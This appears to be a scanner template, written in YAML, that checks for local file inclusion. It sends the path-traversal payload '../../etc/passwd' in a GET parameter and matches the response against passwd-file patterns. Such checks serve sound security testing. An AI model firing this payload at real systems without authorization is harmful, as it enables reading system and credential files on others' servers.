id: lfi-regex-check
info:
  name: "LFI via Regex Matcher"
  severity: "high"
target: "params_get"
requests:
  - method: "GET"
    payload: "../../etc/passwd"
    path: "{{base_url}}?{{param_name}}={{payload}}"
    matchers:
      - type: "status"
        status: 200
      - type: "regex"
        part: "body"
        regex:
          - "root:x:0:0"
          - "daemon:x:1:1"
        condition: "or"